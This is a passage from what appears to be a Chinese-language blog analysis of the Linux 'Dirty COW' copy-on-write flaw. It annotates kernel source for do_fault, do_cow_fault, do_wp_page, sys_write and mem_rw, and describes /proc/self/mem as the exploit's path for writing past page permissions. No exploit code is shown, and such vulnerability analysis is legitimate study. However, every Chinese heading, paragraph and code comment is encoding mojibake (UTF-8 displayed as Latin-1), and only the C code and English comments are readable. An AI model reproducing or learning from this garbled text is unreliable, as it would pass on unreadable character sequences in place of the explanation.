æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºç»“è®ºï¼Œå½“ä¸€ä¸ªè¿›ç¨‹é¦–æ¬¡è®¿é—®ä¸€ä¸ªå†…å­˜é¡µæ—¶ï¼Œä¼šä¾æ¬¡è§¦å‘ä¸¤æ¬¡ç¼ºé¡µå¼‚å¸¸ï¼Œç¬¬ä¸€æ¬¡æ˜¯ä¸ºäº†å»ºç«‹é¡µé¢ä¸ç‰©ç†é¡µçš„æ˜ å°„å…³ç³»ï¼Œç¬¬äºŒæ¬¡æ˜¯ä¸ºäº†å¤„ç†é¡µé¢åœ¨ä¸»å­˜ä¸­çš„å†™æ“ä½œå¼•èµ·çš„ç¼ºé¡µå¼‚å¸¸ã€‚</p><h4 id="do-fault"><a href="#do-fault" class="headerlink" title="do_fault"></a>do_fault</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<span class="hljs-comment">//è·å–äº†æŒ‡å‘å½“å‰è™šæ‹Ÿå†…å­˜åŒºåŸŸï¼ˆVirtual Memory Areaï¼ŒVMAï¼‰çš„æŒ‡é’ˆ vma</span><br><span class="hljs-type">pgoff_t</span> pgoff = linear_page_index(vma, fe-&gt;address);<span class="hljs-comment">//è®¡ç®—é¡µé¢åç§»é‡ï¼Œè¯¥å°†çº¿æ€§åœ°å€è½¬æ¢ä¸ºé¡µé¢åç§»é‡</span><br><br><span class="hljs-comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span><br><span class="hljs-keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)<span class="hljs-comment">//æ£€æŸ¥äº† vma å¯¹è±¡æ˜¯å¦å…·æœ‰æœ‰æ•ˆçš„ fault æ“ä½œã€‚å¦‚æœ vma å¯¹è±¡ä¸­çš„ vm_ops ç»“æ„ä¸­çš„ fault å‡½æ•°æŒ‡é’ˆä¸ºç©ºï¼Œè¯´æ˜è¯¥è™šæ‹Ÿå†…å­˜åŒºåŸŸå¯èƒ½æœªå®Œå…¨åˆå§‹åŒ–æˆ–è€…ç¼ºå°‘ VM_DONTEXPAND æ ‡å¿—ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‡½æ•°è¿”å› VM_FAULT_SIGBUSï¼Œè¡¨ç¤ºå‘ç”Ÿäº†æ€»çº¿é”™è¯¯ã€‚</span><br><span class="hljs-keyword">return</span> VM_FAULT_SIGBUS;<br><span class="hljs-keyword">if</span> (!(fe-&gt;flags &amp; FAULT_FLAG_WRITE))<span class="hljs-comment">//å¦‚æœé¡µé¢é”™è¯¯ä¸æ˜¯å†™æ“ä½œï¼Œåˆ™è°ƒç”¨ do_read_fault å‡½æ•°å¤„ç†è¯»å–æ“ä½œã€‚</span><br><span class="hljs-keyword">return</span> do_read_fault(fe, pgoff);<br><span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))<span class="hljs-comment">//å¦‚æœè™šæ‹Ÿå†…å­˜åŒºåŸŸçš„æ ‡å¿—ä¸­ä¸åŒ…å« VM_SHARED æ ‡å¿—ï¼Œè¯´æ˜è¯¥åŒºåŸŸæ˜¯ç§æœ‰çš„ï¼Œå‡½æ•°è°ƒç”¨ do_cow_fault å‡½æ•°å¤„ç†å†™æ—¶å¤åˆ¶é”™è¯¯ï¼ˆCopy-On-Write Faultï¼‰ã€‚</span><br><span class="hljs-keyword">return</span> do_cow_fault(fe, pgoff);<br><span class="hljs-keyword">return</span> do_shared_fault(fe, pgoff);<span class="hljs-comment">//è™šæ‹Ÿå†…å­˜åŒºåŸŸæ˜¯å…±äº«çš„ï¼Œå‡½æ•°è°ƒç”¨ do_shared_fault å‡½æ•°å¤„ç†å…±äº«é”™è¯¯</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæ— å†…å­˜é¡µï¼‰-do-cow-fault"><a href="#å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæ— å†…å­˜é¡µï¼‰-do-cow-fault" class="headerlink" title="å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæ— å†…å­˜é¡µï¼‰: do_cow_fault()"></a>å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæ— å†…å­˜é¡µï¼‰: do_cow_fault()</h4><p>æœ¬ç¯‡ä¸»è¦å…³æ³¨å†™æ—¶å¤åˆ¶çš„è¿‡ç¨‹ï¼›<code>COW</code>æµç¨‹åœ¨ç¬¬ä¸€æ¬¡å†™æ—¶è§¦å‘ç¼ºé¡µå¼‚å¸¸æœ€ç»ˆä¾¿ä¼šè¿›å…¥åˆ° <code>do_cow_fault()</code> ä¸­å¤„ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_cow_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pgoff_t</span> pgoff)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">fault_page</span>, *<span class="hljs-title">new_page</span>;</span><br><span class="hljs-type">void</span> *fault_entry;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_cgroup</span> *<span class="hljs-title">memcg</span>;</span><br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-keyword">if</span> (unlikely(anon_vma_prepare(vma)))<br><span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br>new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, fe-&gt;address);<span class="hljs-comment">//ä¸ºå½“å‰è¿›ç¨‹åˆ†é…ä¸€ä¸ªæ–°çš„é¡µé¢</span><br><span class="hljs-keyword">if</span> (!new_page)<br><span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br><span class="hljs-keyword">if</span> (mem_cgroup_try_charge(new_page, vma-&gt;vm_mm, GFP_KERNEL,<span class="hljs-comment">//ä¸ºæ–°é¡µé¢åˆ†é…å†…å­˜èµ„æº</span><br>&amp;memcg, <span class="hljs-literal">false</span>)) &#123;<br>put_page(new_page);<br><span class="hljs-keyword">return</span> VM_FAULT_OOM;<br>&#125;<br><br>ret = __do_fault(fe, pgoff, new_page, &amp;fault_page, &amp;fault_entry);<span class="hljs-comment">//è¯»å–æ–‡ä»¶å†…å®¹åˆ°fault_page</span><br><span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br><span class="hljs-keyword">goto</span> uncharge_out;<br><br><span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_DAX_LOCKED))<br>copy_user_highpage(new_page, fault_page, fe-&gt;address, vma);<span class="hljs-comment">//æ‹·è´fault_pageå†…å®¹åˆ°new_page</span><br>__SetPageUptodate(new_page);<br><br>ret |= alloc_set_pte(fe, memcg, new_page);<span class="hljs-comment">//è®¾ç½®pteï¼Œç½®æ¢è¯¥è¿›ç¨‹ä¸­çš„pteè¡¨é¡¹ï¼Œå¯¹äºå†™æ“ä½œä¼šå°†è¯¥é¡µæ ‡è„ï¼ˆè¯¥å‡½æ•°ä¼šè°ƒç”¨maybe_mkwrite()å‡½æ•°ï¼Œå…¶ä¼šè°ƒç”¨pte_mkdirty()å‡½æ•°æ ‡è„è¯¥é¡µï¼‰</span><br><span class="hljs-keyword">if</span> (fe-&gt;pte)<br>pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br><span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_DAX_LOCKED)) &#123;<span class="hljs-comment">//é‡Šæ”¾fault_page</span><br>unlock_page(fault_page);<br>put_page(fault_page);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>dax_unlock_mapping_entry(vma-&gt;vm_file-&gt;f_mapping, pgoff);<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br><span class="hljs-keyword">goto</span> uncharge_out;<br><span class="hljs-keyword">return</span> ret;<br>uncharge_out:<br>mem_cgroup_cancel_charge(new_page, memcg, <span class="hljs-literal">false</span>);<br>put_page(new_page);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæœ‰å†…å­˜é¡µï¼‰ï¼šdo-wp-page"><a href="#å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæœ‰å†…å­˜é¡µï¼‰ï¼šdo-wp-page" class="headerlink" title="å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæœ‰å†…å­˜é¡µï¼‰ï¼šdo_wp_page"></a>å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæœ‰å†…å­˜é¡µï¼‰ï¼šdo_wp_page</h4><p>å½“é€šè¿‡ <code>do_fault()</code> è·å–å†…å­˜é¡µä¹‹åï¼Œç¬¬äºŒæ¬¡è§¦å‘ç¼ºé¡µå¼‚å¸¸æ—¶ä¾¿ä¼šæœ€ç»ˆäº¤ç”± <code>do_wp_page()</code> å‡½æ•°å¤„ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This routine handles present pages, when users try to write</span><br><span class="hljs-comment"> * to a shared page. It is done by copying the page to a new address</span><br><span class="hljs-comment"> * and decrementing the shared-page counter for the old page.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Note that this routine assumes that the protection checks have been</span><br><span class="hljs-comment"> * done by the caller (the low-level page fault routine in most cases).</span><br><span class="hljs-comment"> * Thus we can safely just mark it writable once we&#x27;ve done any necessary</span><br><span class="hljs-comment"> * COW.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * We also mark the page dirty at this point even though the page will</span><br><span class="hljs-comment"> * change only once the write actually happens. This avoids a few races,</span><br><span class="hljs-comment"> * and potentially makes it more efficient.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * We enter with non-exclusive mmap_sem (to exclude vma changes,</span><br><span class="hljs-comment"> * but allow concurrent faults), with pte both mapped and locked.</span><br><span class="hljs-comment"> * We return with mmap_sem still held, but pte unmapped and unlocked.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_wp_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pte_t</span> orig_pte)</span><br>__<span class="hljs-title function_">releases</span><span class="hljs-params">(fe-&gt;ptl)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<span class="hljs-comment">//åŸæœ‰çš„é¡µ</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">old_page</span>;</span><br><br>old_page = vm_normal_page(vma, fe-&gt;address, orig_pte);<span class="hljs-comment">//è·å–ç¼ºé¡µçš„çº¿æ€§åœ°å€å¯¹åº”çš„struct pageç»“æ„ï¼Œå¯¹äºä¸€äº›ç‰¹æ®Šæ˜ å°„çš„é¡µé¢ï¼ˆå¦‚é¡µé¢å›æ”¶ã€é¡µè¿ç§»å’ŒKSMç­‰ï¼‰ï¼Œå†…æ ¸å¹¶ä¸å¸Œæœ›è¿™äº›é¡µå‚ä¸åˆ°å†…å­˜ç®¡ç†çš„ä¸€äº›æµç¨‹å½“ä¸­ï¼Œç§°ä¹‹ä¸º special mappingï¼Œå¹¶æ— å¯¹åº”çš„struct pageç»“æ„ä½“</span><br><span class="hljs-keyword">if</span> (!old_page) &#123;<span class="hljs-comment">//NULLï¼Œè¯´æ˜æ˜¯ä¸€ä¸ª special mapping é¡µé¢ï¼›å¦åˆ™è¯´æ˜æ˜¯normal mappingé¡µé¢</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a</span><br><span class="hljs-comment"> * VM_PFNMAP VMA.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * We should not cow pages in a shared writeable mapping.</span><br><span class="hljs-comment"> * Just mark the pages writable and/or call ops-&gt;pfn_mkwrite.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==<br>     (VM_WRITE|VM_SHARED))<br><span class="hljs-keyword">return</span> wp_pfn_shared(fe, orig_pte);<br><br>pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br><span class="hljs-keyword">return</span> wp_page_copy(fe, orig_pte, old_page);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Take out anonymous pages first, anonymous shared vmas are</span><br><span class="hljs-comment"> * not dirty accountable.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//å…ˆå¤„ç†åŒ¿åé¡µé¢</span><br><span class="hljs-keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123;<span class="hljs-comment">//åŸé¡µé¢ä¸ºåŒ¿åé¡µé¢ &amp;&amp; ä¸æ˜¯ksmé¡µé¢</span><br><span class="hljs-type">int</span> total_mapcount;<br><span class="hljs-keyword">if</span> (!trylock_page(old_page)) &#123;<span class="hljs-comment">//å¤šçº¿ç¨‹ç›¸å…³æ“ä½œï¼Œåˆ¤æ–­æ˜¯å¦æœ‰å…¶ä»–çº¿ç¨‹çš„ç«äº‰</span><br>get_page(old_page);<br>pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>lock_page(old_page);<br>fe-&gt;pte = pte_offset_map_lock(vma-&gt;vm_mm, fe-&gt;pmd,<br>fe-&gt;address, &amp;fe-&gt;ptl);<br><span class="hljs-keyword">if</span> (!pte_same(*fe-&gt;pte, orig_pte)) &#123;<br>unlock_page(old_page);<br>pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>put_page(old_page);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>put_page(old_page);<br>&#125;<br>        <span class="hljs-comment">//æ­¤æ—¶æ²¡æœ‰å…¶ä»–çº¿ç¨‹ä¸æœ¬çº¿ç¨‹ç«äº‰äº†ï¼Œè°ƒç”¨ reuse_swap_page() åˆ¤æ–­ä½¿ç”¨è¯¥é¡µçš„æ˜¯å¦åªæœ‰ä¸€ä¸ªè¿›ç¨‹ï¼Œè‹¥æ˜¯çš„è¯å°±ç›´æ¥é‡ç”¨è¯¥é¡µ</span><br><span class="hljs-keyword">if</span> (reuse_swap_page(old_page, &amp;total_mapcount)) &#123;<br><span class="hljs-keyword">if</span> (total_mapcount == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The page is all ours. Move it to</span><br><span class="hljs-comment"> * our anon_vma so the rmap code will</span><br><span class="hljs-comment"> * not search our parent or siblings.</span><br><span class="hljs-comment"> * Protected against the rmap code by</span><br><span class="hljs-comment"> * the page lock.</span><br><span class="hljs-comment"> */</span><br>page_move_anon_rmap(old_page, vma);<br>&#125;<br>unlock_page(old_page);<br><span class="hljs-keyword">return</span> wp_page_reuse(fe, orig_pte, old_page, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>&#125;<br>unlock_page(old_page);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (unlikely((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==<br>(VM_WRITE|VM_SHARED))) &#123;<br><span class="hljs-keyword">return</span> wp_page_shared(fe, orig_pte, old_page);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Ok, we need to copy. Oh, well..</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//å®åœ¨æ²¡æ³•é‡ç”¨äº†ï¼Œè¿›è¡Œå†™æ—¶å¤åˆ¶</span><br>get_page(old_page);<br><br>pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br><span class="hljs-keyword">return</span> wp_page_copy(fe, orig_pte, old_page);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="COWå’Œç¼ºé¡µå¼‚å¸¸ç›¸å…³æµç¨‹"><a href="#COWå’Œç¼ºé¡µå¼‚å¸¸ç›¸å…³æµç¨‹" class="headerlink" title="COWå’Œç¼ºé¡µå¼‚å¸¸ç›¸å…³æµç¨‹"></a>COWå’Œç¼ºé¡µå¼‚å¸¸ç›¸å…³æµç¨‹</h2><h3 id="writeã®æ‰§è¡Œæµ"><a href="#writeã®æ‰§è¡Œæµ" class="headerlink" title="writeã®æ‰§è¡Œæµ"></a>writeã®æ‰§è¡Œæµ</h3><p>é¦–å…ˆå…ˆæ¥äº†è§£ä¸€ä¸‹ç³»ç»Ÿè°ƒç”¨<code>write</code>çš„æ‰§è¡Œæµ</p><h4 id="sys-write"><a href="#sys-write" class="headerlink" title="sys_write"></a>sys_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C">SYSCALL_DEFINE3(write, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, buf,<br><span class="hljs-type">size_t</span>, count)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span> =</span> fdget_pos(fd);<span class="hljs-comment">//æ ¹æ®fdæ‰¾åˆ°å¯¹åº”çš„æ–‡ä»¶å¯¹è±¡å’Œæ ‡å¿—</span><br><span class="hljs-type">ssize_t</span> ret = -EBADF;<br><br><span class="hljs-keyword">if</span> (f.file) &#123;<br><span class="hljs-type">loff_t</span> pos = file_pos_read(f.file); <span class="hljs-comment">//è¯»å–æ–‡ä»¶å¯¹è±¡çš„ä½ç½®æŒ‡é’ˆ</span><br>ret = vfs_write(f.file, buf, count, &amp;pos);<span class="hljs-comment">//é€šè¿‡è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿæ–‡ä»¶çš„å†™æ“ä½œ</span><br><span class="hljs-keyword">if</span> (ret &gt;= <span class="hljs-number">0</span>)<br>file_pos_write(f.file, pos);   <span class="hljs-comment">//è®¾ç½®æ–‡ä»¶å¯¹è±¡çš„ä½ç½®æŒ‡é’ˆ</span><br>fdput_pos(f);  <span class="hljs-comment">//é‡Šæ”¾è¿™ä¸ªå¯¹è±¡çš„å¼•ç”¨</span><br>&#125;<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">sys_write</span>()<br><span class="hljs-built_in">vfs_write</span>()<br><span class="hljs-built_in">__vfs_write</span>()<br>file-&gt;f_op-&gt;<span class="hljs-built_in">write</span>()<span class="hljs-comment">//è¯¥æ–‡ä»¶äºå†…æ ¸ä¸­çš„æ–‡ä»¶æè¿°ç¬¦çš„file_operationsç»“æ„ä½“ï¼Œç±»ä¼¼äºä¸€å¼ å‡½æ•°è¡¨ï¼Œå‚¨å­˜äº†é»˜è®¤çš„å¯¹äºä¸€äº›ç³»ç»Ÿè°ƒç”¨çš„å¤„ç†å‡½æ•°æŒ‡é’ˆ</span><br></code></pre></td></tr></table></figure><h3 id="proc-self-memï¼šç»•è¿‡é¡µè¡¨é¡¹æƒé™"><a href="#proc-self-memï¼šç»•è¿‡é¡µè¡¨é¡¹æƒé™" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;memï¼šç»•è¿‡é¡µè¡¨é¡¹æƒé™"></a>&#x2F;proc&#x2F;self&#x2F;memï¼šç»•è¿‡é¡µè¡¨é¡¹æƒé™</h3><p>â€œè„ç‰›â€é€šå¸¸åˆ©ç”¨çš„æ˜¯ <code>/proc/self/mem</code> è¿›è¡Œè¶Šæƒå†™å…¥ï¼Œè¿™ä¹Ÿæ˜¯æ•´ä¸ªâ€œè„ç‰›â€åˆ©ç”¨ä¸­è¾ƒä¸ºæ ¸å¿ƒçš„æµç¨‹</p><p>å¯¹äº<code>/proc/self/mem</code>è¿™ä¸ªæ–‡ä»¶å¯¹è±¡æ¥è¯´, ä¼šè°ƒç”¨<code>mem_write()</code>å‡½æ•°</p><h4 id="mem-write"><a href="#mem-write" class="headerlink" title="mem_write()"></a>mem_write()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">mem_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf,</span><br><span class="hljs-params"> <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br><span class="hljs-keyword">return</span> mem_rw(file, (<span class="hljs-type">char</span> __user*)buf, count, ppos, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>mem_write</code>è°ƒç”¨<code>mem_rw</code></p><h4 id="mem-rw"><a href="#mem-rw" class="headerlink" title="mem_rw()"></a>mem_rw()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">mem_rw</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-comment">//è¦è¯»/å†™çš„æ–‡ä»¶</span></span><br><span class="hljs-params">                      <span class="hljs-type">char</span> __user *buf, <span class="hljs-comment">//ç”¨æˆ·ç©ºé—´ç¼“å†²åŒº</span></span><br><span class="hljs-params"><span class="hljs-type">size_t</span> count,    <span class="hljs-comment">//è¯»/å†™é•¿åº¦</span></span><br><span class="hljs-params">                      <span class="hljs-type">loff_t</span> *ppos,  <span class="hljs-comment">//å¼€å§‹çš„åœ°æ–¹</span></span><br><span class="hljs-params">                      <span class="hljs-type">int</span> write)</span> <span class="hljs-comment">//è¯»/å†™</span><br>&#123;<br>    <span class="hljs-comment">//æ ¹æ®/proc/self/memè¿™ä¸ªæ–‡ä»¶å¯¹è±¡çš„ç§æœ‰æ•°æ®åŒºåŸŸ, æ‰¾åˆ°å…¶æ˜ å°„çš„æ˜¯å“ªä¸€ä¸ªè™šæ‹Ÿåœ°å€ç©ºé—´, ç„¶ååœ¨å†…æ ¸ä¸­ç”³è¯·äº†ä¸€ä¸ªä¸´æ—¶é¡µä½œä¸ºå†…æ ¸ç¼“å†²åŒº</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> file-&gt;private_data;<span class="hljs-comment">//memæ–‡ä»¶çš„ç§æœ‰æ•°æ®åŒºåŸŸæŒ‡å‘å¯¹åº”çš„è™šæ‹Ÿå†…å­˜ç©ºé—´</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr = *ppos;<span class="hljs-comment">//åç§»ï¼Œmmä¸­è¦è¯»å†™çš„åœ°å€</span><br><span class="hljs-type">ssize_t</span> copied;<br><span class="hljs-type">char</span> *page;<br><br><span class="hljs-keyword">if</span> (!mm)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>page = (<span class="hljs-type">char</span> *)__get_free_page(GFP_TEMPORARY);<span class="hljs-comment">//è·å–ä¸€ä¸ªä¸´æ—¶é¡µï¼Œsys_writeé™åˆ¶æœ€å¤šå†™ä¸€é¡µ</span><br><span class="hljs-keyword">if</span> (!page)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>copied = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))<span class="hljs-comment">//å¢åŠ ä¸€ä¸ªå¼•ç”¨</span><br><span 